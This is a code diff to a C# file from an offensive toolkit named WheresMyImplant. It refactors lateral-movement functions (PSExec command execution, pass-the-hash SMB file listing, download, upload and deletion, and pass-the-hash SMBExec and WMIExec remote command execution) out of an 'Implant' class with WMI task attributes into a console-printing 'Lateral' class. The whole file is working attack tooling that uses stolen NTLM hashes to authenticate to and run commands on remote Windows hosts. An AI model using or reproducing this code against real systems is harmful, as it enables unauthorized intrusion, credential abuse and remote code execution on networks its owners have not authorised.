@@ -1,17 +1,14 @@
 ﻿using System;
 using System.Linq;
-using System.Management.Instrumentation;
 using System.Text;
 
 namespace WheresMyImplant
 {
-    public partial class Implant
+    public class Lateral
     {
-        [ManagementTask]
         public static void PSExecCommand(String system, String execute, String isCommand)
         {
-            Boolean comspec;
-            if (!Boolean.TryParse(isCommand, out comspec))
+            if (!Boolean.TryParse(isCommand, out Boolean comspec))
             {
                 comspec = false;
             }
@@ -31,10 +28,8 @@ namespace WheresMyImplant
             }
         }
 
-        [ManagementTask]
-        public static String PTHSMBClientList(String uncPath, String domain, String username, String hash)
+        public static void PTHSMBClientList(String uncPath, String domain, String username, String hash)
         {
-            StringBuilder output = new StringBuilder();
             using (SMBClient smbClient = new SMBClient())
             {
                 String target, share, folder = String.Empty;
@@ -43,11 +38,17 @@ namespace WheresMyImplant
                     System.Collections.IEnumerator enumerator = uncPath.Split(new String[] { @"\" }, StringSplitOptions.RemoveEmptyEntries).GetEnumerator();
 
                     if (!enumerator.MoveNext())
-                        return "Invalid UNC Path";
+                    {
+                        Console.WriteLine("[-] Invalid UNC Path");
+                        return;
+                    }
                     target = (String)enumerator.Current;
 
                     if (!enumerator.MoveNext())
-                        return "Invalid UNC Path";
+                    {
+                        Console.WriteLine("[-] Invalid UNC Path");
+                        return;
+                    }
                     share = (String)enumerator.Current;
 
                     StringBuilder sbFolder = new StringBuilder();
@@ -59,12 +60,14 @@ namespace WheresMyImplant
                 }
                 catch (Exception ex)
                 {
-                    return ex.ToString();
+                    Console.WriteLine(ex.ToString());
+                    return;
                 }
 
                 if (!smbClient.Connect(target))
                 {
-                    return "[-] Unable to Connect";
+                    Console.WriteLine("[-] Unable to Connect");
+                    return;
                 }
 
                 smbClient.NegotiateSMB();
@@ -73,7 +76,8 @@ namespace WheresMyImplant
 
                 if (!smbClient.Authenticate(domain, username, hash))
                 {
-                    return "[-] Login Failed";
+                    Console.WriteLine("[-] Login Failed");
+                    return;
                 }
 
                 try
@@ -96,20 +100,14 @@ namespace WheresMyImplant
                 }
                 catch (Exception ex)
                 {
-                    output.Append(ex.ToString());
-                }
-                finally
-                {
-                    output.Append(smbClient.GetOutput());
+                    Console.WriteLine("[-] Unhandled Exception Occured");
+                    Console.WriteLine("[-] {0}", ex.Message);
                 }
             }
-            return output.ToString();
         }
 
-        [ManagementTask]
-        public static String PTHSMBClientGet(String uncPathSource, String destination, String domain, String username, String hash)
+        public static void PTHSMBClientGet(String uncPathSource, String destination, String domain, String username, String hash)
         {
-            StringBuilder output = new StringBuilder();
             using (SMBClientGet smbClient = new SMBClientGet())
             {
                 String target, share, folder, file = String.Empty;
@@ -119,11 +117,17 @@ namespace WheresMyImplant
                     var enumerator = path.GetEnumerator();
 
                     if (!enumerator.MoveNext())
-                        return "Invalid UNC Path";
+                    {
+                        Console.WriteLine("[-] Invalid UNC Path");
+                        return;
+                    }
                     target = (String)enumerator.Current;
 
                     if (!enumerator.MoveNext())
-                        return "Invalid UNC Path";
+                    {
+                        Console.WriteLine("[-] Invalid UNC Path");
+                        return;
+                    }
                     share = (String)enumerator.Current;
 
                     StringBuilder sbFolder = new StringBuilder();
@@ -134,18 +138,26 @@ namespace WheresMyImplant
                 }
                 catch (Exception ex)
                 {
-                    return ex.ToString();
+                    Console.WriteLine("[-] Unhandled Exception Occured");
+                    Console.WriteLine("[-] {0}", ex.Message);
+                    return;
                 }
 
                 if (!smbClient.Connect(target))
-                    return "[-] Unable to Connect";
+                {
+                    Console.WriteLine("[-] Unable to Connect");
+                    return;
+                }
 
                 smbClient.NegotiateSMB();
                 smbClient.NegotiateSMB2();
                 smbClient.NTLMSSPNegotiate();
 
                 if (!smbClient.Authenticate(domain, username, hash))
-                    return "[-] Login Failed";
+                {
+                    Console.WriteLine("[-] Login Failed");
+                    return;
+                }
 
                 try
                 {
@@ -170,20 +182,14 @@ namespace WheresMyImplant
                 }
                 catch (Exception ex)
                 {
-                    output.Append(ex.ToString());
-                }
-                finally
-                {
-                    output.Append(smbClient.GetOutput());
+                    Console.WriteLine("[-] Unhandled Exception Occured");
+                    Console.WriteLine("[-] {0}", ex.Message);
                 }
             }
-            return output.ToString();
         }
 
-        [ManagementTask]
-        public static String PTHSMBClientPut(String source, String uncPathDestination, String domain, String username, String hash)
+        public static void PTHSMBClientPut(String source, String uncPathDestination, String domain, String username, String hash)
         {
-            StringBuilder output = new StringBuilder();
             using (SMBClientPut smbClient = new SMBClientPut())
             {
                 String target, share, folder, file = String.Empty;
@@ -193,11 +199,17 @@ namespace WheresMyImplant
                     var enumerator = path.GetEnumerator();
 
                     if (!enumerator.MoveNext())
-                        return "Invalid UNC Path";
+                    {
+                        Console.WriteLine("[-] Invalid UNC Path");
+                        return;
+                    }
                     target = (String)enumerator.Current;
 
                     if (!enumerator.MoveNext())
-                        return "Invalid UNC Path";
+                    {
+                        Console.WriteLine("[-] Invalid UNC Path");
+                        return;
+                    }
                     share = (String)enumerator.Current;
 
                     StringBuilder sbFolder = new StringBuilder();
@@ -208,18 +220,26 @@ namespace WheresMyImplant
                 }
                 catch (Exception ex)
                 {
-                    return ex.ToString();
+                    Console.WriteLine("[-] Unhandled Exception Occured");
+                    Console.WriteLine("[-] {0}", ex.Message);
+                    return;
                 }
 
                 if (!smbClient.Connect(target))
-                    return "[-] Unable to Connect";
+                {
+                    Console.WriteLine("[-] Unable to Connect");
+                    return;
+                }
 
                 smbClient.NegotiateSMB();
                 smbClient.NegotiateSMB2();
                 smbClient.NTLMSSPNegotiate();
 
                 if (!smbClient.Authenticate(domain, username, hash))
-                    return "[-] Login Failed";
+                {
+                    Console.WriteLine("[-] Login Failed");
+                    return;
+                }
 
                 try
                 {
@@ -241,20 +261,14 @@ namespace WheresMyImplant
                 }
                 catch (Exception ex)
                 {
-                    output.Append(ex.ToString());
-                }
-                finally
-                {
-                    output.Append(smbClient.GetOutput());
+                    Console.WriteLine("[-] Unhandled Exception Occured");
+                    Console.WriteLine("[-] {0}", ex.Message);
                 }
             }
-            return output.ToString();
         }
 
-        [ManagementTask]
-        public static String PTHSMBClientDelete(String uncPathDestination, String domain, String username, String hash)
+        public static void PTHSMBClientDelete(String uncPathDestination, String domain, String username, String hash)
         {
-            StringBuilder output = new StringBuilder();
             using (SMBClientDelete smbClient = new SMBClientDelete())
             {
                 String target, share, folder, file = String.Empty;
@@ -264,11 +278,17 @@ namespace WheresMyImplant
                     var enumerator = path.GetEnumerator();
 
                     if (!enumerator.MoveNext())
-                        return "Invalid UNC Path";
+                    {
+                        Console.WriteLine("[-] Invalid UNC Path");
+                        return;
+                    }
                     target = (String)enumerator.Current;
 
                     if (!enumerator.MoveNext())
-                        return "Invalid UNC Path";
+                    {
+                        Console.WriteLine("[-] Invalid UNC Path");
+                        return;
+                    }
                     share = (String)enumerator.Current;
 
                     StringBuilder sbFolder = new StringBuilder();
@@ -279,18 +299,26 @@ namespace WheresMyImplant
                 }
                 catch (Exception ex)
                 {
-                    return ex.ToString();
+                    Console.WriteLine("[-] Unhandled Exception Occured");
+                    Console.WriteLine("[-] {0}", ex.Message);
+                    return;
                 }
 
                 if (!smbClient.Connect(target))
-                    return "[-] Unable to Connect";
+                {
+                    Console.WriteLine("[-] Unable to Connect");
+                    return;
+                }
 
                 smbClient.NegotiateSMB();
                 smbClient.NegotiateSMB2();
                 smbClient.NTLMSSPNegotiate();
 
                 if (!smbClient.Authenticate(domain, username, hash))
-                    return "[-] Login Failed";
+                {
+                    Console.WriteLine("[-] Login Failed");
+                    return;
+                }
 
                 try
                 {
@@ -314,20 +342,14 @@ namespace WheresMyImplant
                 }
                 catch (Exception ex)
                 {
-                    output.Append(ex.ToString());
-                }
-                finally
-                {
-                    output.Append(smbClient.GetOutput());
+                    Console.WriteLine("[-] Unhandled Exception Occured");
+                    Console.WriteLine("[-] {0}", ex.Message);
                 }
             }
-            return output.ToString();
         }
 
-        [ManagementTask]
-        public static String PTHSMBExec(String target, String command, String domain, String username, String hash)
+        public static void PTHSMBExec(String target, String command, String domain, String username, String hash)
         {
-            StringBuilder output = new StringBuilder();
             try
             {
                 using (SMBExec smbExec = new SMBExec())
@@ -359,30 +381,25 @@ namespace WheresMyImplant
                         }
                         catch (Exception ex)
                         {
-                            output.Append(ex.ToString());
-                        }
-                        finally
-                        {
-                            output.Append(smbExec.GetOutput());
+                            Console.WriteLine("[-] Unhandled Exception Occured");
+                            Console.WriteLine("[-] {0}", ex.Message);
                         }
                     }
                     else
                     {
-                        output.Append("[-] Login Failed");
+                        Console.WriteLine("[-] Login Failed");
                     }
                 }
             }
             catch (Exception ex)
             {
-                output.Append(ex.ToString());
+                Console.WriteLine("[-] Unhandled Exception Occured");
+                Console.WriteLine("[-] {0}", ex.Message);
             }
-            return output.ToString();
         }
 
-        [ManagementTask]
-        public static String PTHWMIExec(String target, String command, String domain, String username, String hash)
+        public static void PTHWMIExec(String target, String command, String domain, String username, String hash)
         {
-            StringBuilder output = new StringBuilder();
             try
             {
                 using (WMIExec wmiExec = new WMIExec(command))
@@ -405,14 +422,13 @@ namespace WheresMyImplant
                         wmiExec.AuthenticateRandom(domain, username, hash);
                         wmiExec.QueryInterface();
                     }
-                    output.Append(wmiExec.GetOutput());
                 }
             }
             catch (Exception ex)
             {
-                output.Append(ex.ToString());
+                Console.WriteLine("[-] Unhandled Exception Occured");
+                Console.WriteLine("[-] {0}", ex.Message);
             }
-            return output.ToString();
         }
     }
 }
